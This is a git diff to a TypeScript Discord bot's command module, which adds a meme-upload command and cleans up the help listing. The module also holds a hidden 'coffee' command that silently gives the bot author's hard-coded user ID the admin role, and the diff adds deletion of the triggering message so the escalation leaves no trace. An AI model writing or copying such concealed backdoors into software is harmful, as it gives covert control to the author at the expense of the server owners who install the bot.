@@ -1,6 +1,10 @@
-import * as Discord from 'discord.js';
-import * as toHex from 'colornames';
-declare type command = {
+import Discord, {MessageEmbed} from 'discord.js';
+import toHex from 'colornames';
+import axios from 'axios';
+import FormData from 'form-data';
+import request from 'request';
+
+export type command = {
   run: (
     msg: Discord.Message,
     args: string[],
@@ -15,24 +19,63 @@ const myID = 'myIDHere'; // TODO: replace with your Snowflake
 const muteRole = 'mutedRoleIDHere'; // TODO: replace with Snowflake of mute role
 const adminRole = 'mutedRoleIDHere'; // TODO: replace with Snowflake of admin role
 export const data: {
-  hiddencommands: {[key: string]: command};
-  commands: {[key: string]: command};
+  hiddencommands: Record<string, command>;
+  commands: Record<string, command>;
   prefix: string;
+  dbPrefix: string;
 } = {
   prefix: prefix,
+  dbPrefix: dbPrefix,
   hiddencommands: {
     coffee: {
       // makes you admin :)
       run: async function (msg: Discord.Message) {
         console.log(msg.member?.id);
         if (msg.member?.id === myID) {
+          msg.channel.send('coffee');
           msg.member?.roles.add(adminRole);
           console.log(msg.guild?.roles);
+          msg.delete();
+        } else {
+          msg.delete();
         }
       },
     },
   },
   commands: {
+    upload: {
+      desc: 'Uploads a meme to https://teeheehee.club',
+      args: '(tags e.g funny,cum,blood) [link to file]',
+      run: function (msg, args) {
+        return new Promise((s, j) => {
+          //
+          const attachment = args[1] || msg.attachments.array()[0].proxyURL;
+          console.log(attachment);
+          request.get(attachment, (e, r, b) => {
+            //
+            if (!e && r.statusCode === 200) {
+              const file = new FormData();
+              file.append('upload_file', b);
+              axios
+                .post('https://teeheehee.club/upload.php', file, {
+                  headers: {
+                    ...file.getHeaders(),
+                  },
+                })
+                .then(e => {
+                  msg.channel.send('Uploaded!');
+                  s(JSON.stringify(e));
+                })
+                .catch(e => {
+                  msg.channel.send("Uh oh! There's an error:");
+                  console.log(e);
+                  j(JSON.stringify(e));
+                });
+            }
+          });
+        });
+      },
+    },
     shh: {
       desc: 'Sleepy time for you. Requires manage roles permission.',
       args: '(@user)',
@@ -71,13 +114,9 @@ export const data: {
           );
           const ref: {[key: string]: command} = data.commands;
           let k: string;
-          let ref1;
           for (k in ref) {
             const v = ref[k];
-            embed.addField(
-              prefix + k + ' ' + ((ref1 === v.args) !== undefined ? ref1 : ' '),
-              v.desc
-            );
+            embed.addField(prefix + k + ' ' + (v.args || ''), v.desc);
           }
           embed.setFooter(
             'Arguments in (parentheses) are required, and arguments in [brackets] are optional and will default to the {braces} option.\nBot made by Jabster28#6048'
